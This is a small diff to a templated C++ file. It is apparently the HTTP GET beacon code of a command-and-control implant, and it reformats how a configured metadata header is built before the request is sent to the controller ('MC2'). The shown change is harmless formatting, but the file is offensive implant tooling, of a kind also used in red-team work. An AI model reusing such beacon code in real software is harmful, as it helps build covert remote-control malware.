@@ -68,7 +68,7 @@ nlohmann::json get(std::string implant_uuid) {
 
     [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "header" %]
-    headers.push_back(L"[[http_get_client_metadata_terminator_value]]" + L": " + w_metadata);
+    headers.push_back(L"[[http_get_client_metadata_terminator_value]]: " + w_metadata);
     [% endif %]
 
     [# HTTP_GET: METADATA: PARAMETER - IF MC2 says it wants a header for where to find the metadata... #]
